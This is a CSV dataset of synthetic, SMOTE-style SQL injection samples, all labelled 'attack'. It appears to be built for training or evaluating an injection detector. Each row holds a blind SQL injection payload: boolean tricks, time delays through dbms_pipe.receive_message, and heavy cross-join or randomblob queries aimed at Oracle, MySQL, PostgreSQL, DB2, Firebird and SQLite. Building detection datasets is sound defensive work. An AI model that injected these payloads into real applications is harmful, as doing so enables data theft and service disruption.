id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000139,attack,boolean,"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000054,0.20190986946140738
SMOTE_000140,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.26176839867314244
SMOTE_000141,attack,boolean,"1%'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",nearest_attack_euclidean,R000230,0.9521003129033758
SMOTE_000142,attack,boolean,"1'   )    )    as babx where 2494  =  2494 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000146,0.7348320577955502
SMOTE_000143,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000125,0.8649870857869133
SMOTE_000144,attack,boolean,"-8791""   )    )     )   or make_set  (  6681  =  6620,6620  )   and    (    (     (  ""pvdk""  =  ""pvdk",nearest_attack_euclidean,R000025,0.0002145922923398795
SMOTE_000145,attack,boolean,"1%""   )    )    and elt  (  7633  =  4110,4110  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000237,0.21582746884838344
SMOTE_000146,attack,boolean,-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',nearest_attack_euclidean,R000295,0.332791102362048
SMOTE_000147,attack,boolean,-2361'   )    )    as mzhv where 2905  =  2905 or 9026  =  5388--,nearest_attack_euclidean,R000179,0.8337861078388579
SMOTE_000148,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",nearest_attack_euclidean,R000037,0.09248191672159112
SMOTE_000149,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R000102,2.079894807351928
SMOTE_000150,attack,boolean,"1""  )   as nqtn where 5606  =  5606 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000251,0.2582891441288214
SMOTE_000151,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'vxqs'  =  'vxqs",nearest_attack_euclidean,R000042,0.14671763647123662
SMOTE_000152,attack,boolean,-8538%' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',nearest_attack_euclidean,R000295,0.16155073473319975
SMOTE_000153,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,0.7375917441157807
SMOTE_000154,attack,boolean,"1' where 8837  =  8837 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000118,1.5457737982533792
SMOTE_000155,attack,boolean,"1  )   where 9687  =  9687 and elt  (  9607  =  9432,9432  )  --",nearest_attack_euclidean,R000257,0.655464847318159
SMOTE_000156,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.5342402026664865
SMOTE_000157,attack,boolean,"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000116,0.49068854965960224
SMOTE_000158,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000136,0.5789553945571313
SMOTE_000159,attack,boolean,"-6890""   )    )    or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ftho"" like ""ftho",nearest_attack_euclidean,R000205,1.214869988272503
SMOTE_000160,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000177,0.0504767419977459
SMOTE_000161,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'bhlx' like 'bhlx",nearest_attack_euclidean,R000125,1.1407785020590056
SMOTE_000162,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000066,0.5163838483517572
SMOTE_000163,attack,boolean,"-7119""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""rmzm""  =  ""rmzm",nearest_attack_euclidean,R000212,0.21323165186538864
SMOTE_000164,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'atvu'  =  'atvu",nearest_attack_euclidean,R000041,0.9091803551548137
SMOTE_000165,attack,boolean,1'   )    )    rlike   (  select   (  case when   (  6205  =  1384  )   then 1 else 0x28 end   )    )    and    (    (   'ahjf'  =  'ahjf,nearest_attack_euclidean,R000312,0.9348083068482281
SMOTE_000166,attack,boolean,"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000149,0.25473150012935103
SMOTE_000167,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R000103,0.05046336187843509
SMOTE_000168,attack,boolean,"-1162""   )    )    as mhmh where 8710  =  8710 or make_set  (  4822  =  7598,7598  )  --",nearest_attack_euclidean,R000302,0.09737425846921607
SMOTE_000169,attack,boolean,"1' where 8749  =  8749 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000024,0.1208157152385218
SMOTE_000170,attack,boolean,"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",nearest_attack_euclidean,R000097,1.0424912746421566
SMOTE_000171,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000088,0.9900413207790117
SMOTE_000172,attack,boolean,"1%""  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000052,0.9804385439266082
SMOTE_000173,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000215,0.41278204735960083
SMOTE_000174,attack,boolean,"1%""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000227,0.011604346227567564
SMOTE_000175,attack,boolean,"1'   )    )    as vqrt where 5173  =  5173 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000173,0.4381446469774678
SMOTE_000176,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""rkvr""  =  ""rkvr",nearest_attack_euclidean,R000077,1.9530341648041147
SMOTE_000177,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",nearest_attack_euclidean,R000161,0.24513520334612487
SMOTE_000178,attack,boolean,"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000188,0.40799544102127216
SMOTE_000179,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000240,0.8512322571862805
SMOTE_000180,attack,boolean,1'  )   rlike   (  select   (  case when   (  2671  =  4485  )   then 1 else 0x28 end   )    )    and   (  'ezco' like 'ezco,nearest_attack_euclidean,R000293,0.05444395654695754
SMOTE_000181,attack,boolean,1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,nearest_attack_euclidean,R000126,0.08142408555143474
SMOTE_000182,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000104,0.9116242618019846
SMOTE_000183,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,0.21135245913453277
SMOTE_000184,attack,boolean,"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",nearest_attack_euclidean,R000119,0.7829432025618336
SMOTE_000185,attack,boolean,"-4350""   )    )    as mmwq where 9801  =  9801 or   (  8520  =  2834  )  *2834--",nearest_attack_euclidean,R000184,0.9779239704544979
SMOTE_000186,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""yxes"" like ""yxes",nearest_attack_euclidean,R000222,0.8600622029710905
SMOTE_000187,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000045,0.675536963799465
SMOTE_000188,attack,boolean,"-2925%"" or make_set  (  9354  =  9354,7185  )   and ""%""  =  """,nearest_attack_euclidean,R000057,0.09405811555843564
SMOTE_000189,attack,boolean,"-2414%""  )   or elt  (  1032  =  1032,3623  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000221,0.5167064409294209
SMOTE_000190,attack,boolean,-3596   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  3645  =  3645,nearest_attack_euclidean,R000304,0.5242644384065389
SMOTE_000191,attack,boolean,"-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj",nearest_attack_euclidean,R000099,0.4525417933953338
SMOTE_000192,attack,boolean,"1""  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  ""rzja"" like ""rzja",nearest_attack_euclidean,R000183,0.05610263960389381
SMOTE_000193,attack,boolean,"1%'  )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000279,1.1306289535177867
SMOTE_000194,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000088,0.6914279897909057
SMOTE_000195,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000244,1.5307011111657727
SMOTE_000196,attack,boolean,"-8425""   )    )    or   (  6485  =  1127  )  *1127 and    (    (   ""qruf""  =  ""qruf",nearest_attack_euclidean,R000136,0.5718756947509257
SMOTE_000197,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R000213,0.1509369286209601
SMOTE_000198,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000053,0.5756426340760744
SMOTE_000199,attack,boolean,"-4932%""   )    )    or   (  3076  =  5927  )  *5927 and    (    (   ""%""  =  """,nearest_attack_euclidean,R000249,0.05812141487055774
SMOTE_000200,attack,boolean,"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000225,0.7762353418549007
